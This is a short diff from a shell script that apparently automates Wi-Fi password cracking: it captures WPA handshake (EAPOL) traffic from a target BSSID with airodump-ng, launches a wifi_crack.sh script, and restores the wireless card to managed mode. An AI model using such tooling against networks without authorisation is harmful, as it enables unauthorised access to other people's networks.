@@ -35,4 +35,9 @@ airodump-ng -c $channel_num --bssid $target_BSSID -w ./log/$packet_file_name $wi
 tee /dev/tty | grep -i -m 5 EAPOL && \
 kill $(pgrep konsole | awk 'NR==2 {print $1}')
 
-konsole -e sudo sh wifi_crack.sh $target_BSSID $packet_file_name &
+konsole -e sudo sh wifi_crack.sh $target_BSSID $packet_file_name
+
+sudo ip link set $wifi_card_name down
+sudo iw dev $wifi_card_name set type managed
+sudo ip link set $wifi_card_name up
+sudo systemctl restart NetworkManager
